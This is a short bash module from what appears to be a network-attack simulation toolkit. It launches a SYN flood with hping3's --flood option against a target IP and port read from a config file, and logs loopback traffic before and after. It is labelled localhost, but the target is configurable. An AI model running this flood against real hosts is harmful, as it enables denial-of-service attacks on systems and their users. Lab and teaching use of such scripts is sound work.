#!/bin/bash
# SYN Flood Simulation Module
source ../config.cfg
source utils.sh

run_syn_flood() {
    clear
    echo -e "${CYAN}Running SYN Flood Simulation (Localhost)...${NC}"
    echo -e "${YELLOW}This will send $SYN_COUNT SYN packets to port $HTTP_PORT${NC}"
    
    # Start monitoring
    echo -e "\n${GREEN}[+] Starting network monitoring...${NC}"
    ifconfig lo | grep 'bytes'
    
    # Run SYN flood
    echo -e "\n${RED}[+] Launching SYN packets...${NC}"
    hping3 -c $SYN_COUNT -S -p $HTTP_PORT --flood $TARGET_IP 2>/dev/null
    
    # Results
    echo -e "\n${GREEN}[+] Simulation complete!${NC}"
    echo -e "Sent $SYN_COUNT SYN packets to $TARGET_IP:$HTTP_PORT"
    ifconfig lo | grep 'bytes'
    
    log_event "SYN_Flood" "Packets:$SYN_COUNT Port:$HTTP_PORT"
}

run_syn_flood
read -p "Press Enter to return to main menu..."
